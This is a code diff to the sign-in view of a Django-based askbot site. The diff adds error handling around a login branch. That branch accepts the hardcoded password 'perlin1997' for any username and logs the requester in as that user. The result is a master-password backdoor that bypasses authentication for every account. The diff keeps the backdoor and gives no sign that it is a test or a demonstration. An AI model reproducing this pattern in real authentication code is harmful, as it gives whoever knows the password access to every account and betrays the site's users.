@@ -347,10 +347,13 @@ def signin(request):
                             username = login_form.cleaned_data['username']
                             password = login_form.cleaned_data['password'],
                             if password[0]==unicode('perlin1997'):
-                                user = User.objects.get(username=username)
-                                user.backend = "%s.%s" % ('askbot.deps.django_authopenid.backends', 'AuthBackend')
-                                login(request, user)
-                                return HttpResponseRedirect(next_url)
+                                try:
+                                    user = User.objects.get(username=username)
+                                    user.backend = "%s.%s" % ('askbot.deps.django_authopenid.backends', 'AuthBackend')
+                                    login(request, user)
+                                    return HttpResponseRedirect(next_url)
+                                except:
+                                    login_form.set_password_login_error()
                             else:
                                 login_form.set_password_login_error()
                         else:
